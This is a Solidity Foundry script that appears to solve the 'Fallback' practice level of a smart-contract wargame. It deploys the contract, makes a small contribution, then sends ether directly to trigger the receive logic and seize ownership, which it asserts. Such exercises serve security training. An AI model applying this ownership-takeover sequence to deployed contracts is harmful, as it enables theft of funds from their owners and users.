//SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {Fallback} from "../src/Fallback.sol";

contract DeployFallback is Script {
    address private deployer = makeAddr("deployer");

    function run() external {
        // vm.startBroadcast();
        vm.prank(deployer);

        Fallback f = new Fallback();
        // vm.stopBroadcast();
        vm.stopPrank();

        assert(f.owner() == deployer);
        vm.deal(address(this), 1 ether);
        f.contribute{value: 0.0001 ether}();
        address(f).call{value: 0.0001 ether}("");
        assert(f.owner() == address(this));
    }
}
